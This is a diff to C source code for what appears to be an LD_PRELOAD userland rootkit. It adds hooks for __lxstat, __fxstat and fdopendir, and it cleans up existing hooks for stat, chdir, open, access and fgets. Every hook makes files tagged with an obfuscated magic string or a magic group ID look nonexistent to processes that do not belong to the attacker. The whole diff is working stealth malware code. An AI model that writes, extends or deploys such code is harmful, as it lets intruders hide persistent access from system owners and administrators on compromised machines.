@@ -78,6 +78,8 @@ int (*old_renameat)(int olddirfd, const char *oldpath, int newdirfd, const char 
 int (*old_stat)(const char *path, struct stat *buf);
 int (*old_stat64)(const char *path, struct stat64 *buf);
 int (*old___xstat)(int ver, const char *path, struct stat *buf); 
+int (*old___lxstat)(int ver, const char *path, struct stat *buf); 
+int (*old___fxstat)(int ver, int fildes, struct stat *buf);
 int (*old_fstat)(int fildes, struct stat *buf); 
 int (*old_fstatat)(int fd, const char *restrict path, struct stat *restrict buf, int flag); 
 int (*old_lstat)(const char *restrict path, struct stat *restrict buf);
@@ -169,6 +171,7 @@ int stat(const char *path, struct stat *buf)
 	if (owned()) return old_stat(path, buf); 
 	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
 	{
+		CLEAN(magic);
 		errno = ENOENT; 
 		return -1; 
 	}
@@ -202,20 +205,72 @@ int __xstat(int ver, const char *path, struct stat *buf)
 	#ifdef DEBUG 
 	printf("[!] __xstat hooked\n"); 
 	#endif	
-	char *magic = strdup(MAGIC); xor(magic); 
+	
 	struct stat filestat;
        	old___xstat(ver, path, &filestat);	
 	#ifdef DEBUG
 	printf("file: %s\n", path); 
 	printf("gid: %d\n", filestat.st_gid);
 	#endif
+	if (owned()) return old___xstat(ver, path, buf);
+	char *magic = strdup(MAGIC); xor(magic);
 	if (strstr(path, magic) || filestat.st_gid == MAGICGID )
 	{
+		CLEAN(magic);
 		errno = ENOENT; 
 		return -1; 
 	}
+	CLEAN(magic);
 	return old___xstat(ver, path, buf); 
 } 
+
+int __lxstat(int ver, const char *path, struct stat *buf)
+{ 
+	HOOK(__lxstat); 
+	#ifdef DEBUG 
+	printf("[!] lxstat hooked\n"); 
+	#endif 
+
+	if (owned())
+	{
+		return old___lxstat(ver, path, buf); 
+	}
+	char *magic = strdup(MAGIC); xor(magic);
+	struct stat filestat; 
+	old___lxstat(ver, path, &filestat); 
+	if (strstr(path, magic) || filestat.st_gid == MAGICGID)
+	{
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return -1; 
+	}
+	CLEAN(magic);
+	return old___lxstat(ver, path, buf); 
+}
+	
+int __fxstat(int ver, int fildes, struct stat *buf)
+{ 
+	HOOK(__fxstat); 
+	#ifdef DEBUG
+	printf("[!] fxstat hooked\n"); 
+	#endif 
+
+	if (owned())
+	{ 
+		return old___fxstat(ver, fildes, buf); 
+	}
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old___fxstat(ver, fildes, &filestat); 
+	if (filestat.st_gid == MAGICGID)
+	{ 
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return -1; 
+	}
+	CLEAN(magic); 
+	return old___fxstat(ver, fildes, buf);
+}
 
 int lstat(const char *pathname, struct stat *buf)
 { 
@@ -512,20 +567,22 @@ struct dirent *readdir(DIR *dirp)
 int chdir(const char *path)
 { 
 	HOOK(chdir);
+	HOOK(__xstat);
 	#ifdef DEBUG
 	printf("[!] chdir hooked\n"); 
 	#endif
 
-	char *magic = strdup(MAGIC); xor(magic);
        	struct stat filestat; 
 	old___xstat(_STAT_VER, path, &filestat);	
-	memset(&filestat, 0x00, sizeof(filestat));
 	if (owned()) return old_chdir(path);
+	char *magic = strdup(MAGIC); xor(magic);
 	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
 	{
+		CLEAN(magic);
 		errno = ENOENT; 
 		return -1; 
 	}
+	CLEAN(magic);
 	return old_chdir(path);
 } 
 
@@ -614,6 +671,28 @@ int rmdir(const char *pathname)
 	return old_rmdir(pathname); 
 }
 
+DIR *fdopendir(int fd)
+{ 
+	HOOK(fdopendir);
+	HOOK(__fxstat);
+	#ifdef DEBUG 
+	printf("[!] fdopendir hooked\n"); 
+	#endif 
+
+	if (owned()) return old_fdopendir(fd); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old___fxstat(_STAT_VER, fd, &filestat); 
+	if (filestat.st_gid == MAGICGID)
+	{
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return NULL; 
+	}
+	CLEAN(magic); 
+	return old_fdopendir(fd);
+}
+
 DIR *opendir(const char *name)
 { 
 	HOOK(opendir); 
@@ -628,6 +707,7 @@ DIR *opendir(const char *name)
 	if (owned()) return old_opendir(name); 
 	if ((strstr(name, magic)) || filestat.st_gid == MAGICGID)
 	{
+		CLEAN(magic);
 		errno = ENOENT; 
 		return NULL; 
 	}
@@ -649,6 +729,7 @@ int open(const char *file, int oflag, ...)
 	old___xstat(_STAT_VER, file, &filestat); 
 	if ((strstr(file, magic)) || filestat.st_gid == MAGICGID)
 	{ 
+		CLEAN(magic);
 		errno = ENOENT; 
 		return -1; 
 	}
@@ -691,6 +772,7 @@ int access(const char *pathname, int mode)
 	old___xstat(_STAT_VER, pathname, &filestat); 
 	if ((strstr(pathname, magic)) || filestat.st_gid == MAGICGID)
 	{ 
+		CLEAN(magic);
 		errno = ENOENT; 
 		return -1; 
 	}
@@ -741,14 +823,12 @@ char *fgets(char *s, int size, FILE *stream)
 		if (filestat.st_gid == MAGICGID)
 		{ 
 			CLEAN(magic); 
-			CLEAN(p);
 			return NULL; // s is owned by magic; return null
 		}
 		else
 		{
+			CLEAN(magic); 
 			return p; // continue
-			CLEAN(magic);
-			CLEAN(p); 	
 		}	
 	}
 	return p;
